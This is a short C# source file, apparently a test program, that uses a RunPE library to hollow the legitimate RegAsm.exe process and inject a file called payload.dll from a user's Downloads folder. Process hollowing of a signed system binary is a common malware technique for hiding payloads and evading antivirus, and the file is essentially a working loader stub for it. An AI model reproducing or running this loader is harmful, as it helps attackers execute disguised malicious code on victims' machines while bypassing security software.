using System;
using System.Runtime.InteropServices;
using System.IO;
using CRunPE;

namespace ExecTestApp {
	class OrchTest {

		
		static void Main(string[] args){
			RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), File.ReadAllBytes(@"C:\Users\cr8zyeights88\Downloads\payload.dll"));
		}
	}
}